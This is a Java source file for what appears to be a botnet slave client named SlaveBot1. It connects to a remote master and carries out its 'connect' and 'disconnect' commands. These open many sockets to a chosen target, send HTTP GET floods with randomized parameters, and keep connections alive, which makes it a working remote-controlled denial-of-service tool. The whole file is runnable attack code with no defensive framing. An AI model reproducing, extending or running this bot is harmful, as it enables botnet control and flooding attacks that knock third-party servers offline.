import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.PrintStream;
import java.net.Socket;
import java.util.*;
import java.text.*;

class sockConn{
String 	regDate;
String 	targetHost;
String 	targetName;
int	targetPort;
Socket 	targetSock;
  sockConn() {
	Date date = new Date();
	SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
	String format = formatter.format(date);
	regDate=format;
  }
}


public class SlaveBot1 {

  public static ArrayList<sockConn> connList;
  public static Socket theSocket;

  public static void main(String[] args) throws Exception {
	if (args.length<4){
	  System.err.println("Error in the arguments provided. port number and host details should be provided for client.");
	 System.exit(-1);	
	}
    	

	String hostname = "";
    	String port = "";

	for (int t=0; t<3; t++){
		if (args[t].equals("-h")){ hostname=args[t+1];}
		else if (args[t].equals("-p")){ port=args[t+1];}
	}

        if (hostname.equals("") || port.equals("")  ){	
	System.err.println("Error in the arguments provided. port number should be provided for server.");
	System.exit(-1);
	}

    connList = new ArrayList<sockConn>();
	try{
    		Integer.parseInt(port);
	}
	catch (Exception e){
	System.err.println("port number should be integer.");
	System.exit(-1);
	}
     theSocket = new Socket(hostname, Integer.parseInt(port));
    BufferedReader netIn = new BufferedReader(new InputStreamReader(theSocket.getInputStream()));
    //System.out.println("Connected to master and waiting for a command.");
    sockConn sockList;
    while (true) {
	try{
      String theLine = netIn.readLine();
      //System.out.println("Server Command : "+ theLine);
      if (theLine !="") {
      String[] serverCmd = theLine.split(" ");
      //System.out.println(serverCmd[0]);
	if(serverCmd[0].equals("connect")){
		if(serverCmd[1] != null && serverCmd[2]!= null && serverCmd[3]!= null){    	
			String targethostname = serverCmd[1];
		    	int targetport = Integer.parseInt(serverCmd[2].toString());
			int num = Integer.parseInt(serverCmd[3].toString());
			int isUrl=Integer.parseInt(serverCmd[4].toString());
			Socket targetSocket;
			for (int i=0; i< num; i++){
				      try {	
			    			
						Random ran = new Random();
						int top = ran.nextInt(10);
						char data = ' ';
						String dat = "";

						for (int a=0; a<=top; a++) {
						  data = (char)(ran.nextInt(25)+97);
						  dat = data + dat;
						}

						if(isUrl==1){

						int ind=serverCmd[5].indexOf( '=' );
						String param=serverCmd[5].substring(ind+1,serverCmd[5].length());
						param=param+dat;
						//System.out.println(dat);
						targetSocket = new Socket(targethostname, 80);
						HttpRes reqRes = new HttpRes(targetSocket,param);
      						reqRes.start(); 
						}
						else{
						targetSocket = new Socket(targethostname, targetport);
							if(isUrl==2){
								targetSocket.setKeepAlive(true);
//System.out.println("keep alive hit");
							}
						}

						    sockList=new sockConn();
						    sockList.targetHost=targetSocket.getInetAddress().getHostAddress();
						    sockList.targetName=targetSocket.getInetAddress().getHostName();
						    sockList.targetPort=targetport;
						    sockList.targetSock=targetSocket;
						    connList.add(sockList);
						//System.out.println(" connection established for socket with following credentials " + targethostname+" " + targetport);
            				} 
				      catch (Exception e) {
						System.out.println(" could not open connection for socket with following credentials " + targethostname+" " + targetport);
					}

			}
			
		}
		else{
			System.out.println(" no  proper arguments for connect");
		}

	}
	else if(serverCmd[0].equals("disconnect")){
		if(serverCmd[1]!= null ){ 
	
			ArrayList<sockConn> s = new ArrayList<sockConn>();
			Iterator iterator = connList.iterator();
			while (iterator.hasNext())
			{
			    sockConn o = (sockConn) iterator.next();
			    if(!s.contains(o)) s.add(o);
			}
			
			int isIp=0;
			String target = serverCmd[1];

			if (target.matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){isIp=1; }
			else {	isIp=0;}

		    	int targetport=0;
			if(serverCmd[2]!= null ){			
				targetport= Integer.parseInt(serverCmd[2].toString());
			}
			Iterator<sockConn> it = s.iterator();
		      switch (isIp) {
		       case 1:  
				while (it.hasNext()) {
				   sockConn s1 = it.next();
					if(targetport==0){
						if(s1.targetHost.equals(target)){
							s1.targetSock.close();
							it.remove();
						}
					}
					else{
						if(s1.targetHost.equals(target) && s1.targetPort==targetport){
							s1.targetSock.close();
							it.remove();
						}
					}
				   
				}
				break;
		       case 0:  
				while (it.hasNext()) {
				   sockConn s1 = it.next(); 
					if(targetport==0){
						if(s1.targetName.equals(target)){
							s1.targetSock.close();
							it.remove();
						}
					}
					else{
						if(s1.targetName.equals(target) && s1.targetPort==targetport){
							s1.targetSock.close();
							it.remove();
						}
					}
				   
				}
				break;
			}
			connList=s;
					//System.out.println("******************************************************");
					//System.out.println("Remaining Connections");
					//for(int i=0;i<connList.size(); i++){
		  					//System.out.println(connList.get(i).targetName+"\t"+connList.get(i).targetHost + "\t"+ connList.get(i).targetPort + "\t"+ connList.get(i).regDate);

					//}
					//System.out.println("******************************************************");

		}
		else{
			System.out.println(" no  proper arguments for disconnect");
		}	
	}
	else{
		 System.out.println(" not a proper command " +  serverCmd[0]);
	}
	
	}
		}

		catch (Exception e) {
	      	e.printStackTrace();
		System.exit(-1);	    
}
    }

  }

}


class HttpRes extends Thread {
  Socket thisSock;
  String urlString;
  HttpRes(Socket sock,String strUrl) {
    thisSock = sock;
    urlString=strUrl;
  }
  public void run() {
  try
        {

            PrintWriter out = new PrintWriter( thisSock.getOutputStream() );
            BufferedReader in = new BufferedReader( new InputStreamReader( thisSock.getInputStream() ) );
		//System.out.println(thisSock.getInetAddress().getHostName()+urlString);
//+urlString +
  		out.print("GET "+urlString +" HTTP/1.1\r\n");
		out.print("Host: "+thisSock.getInetAddress().getHostName()+"\r\n\r\n");
		out.flush();

            String line = in.readLine();
            while( line != null )
            {
                //System.out.println( line );
                line = in.readLine();
            }
            in.close();
            out.close();
        }
        catch( Exception e )
        {
            e.printStackTrace();
        }
  }
}


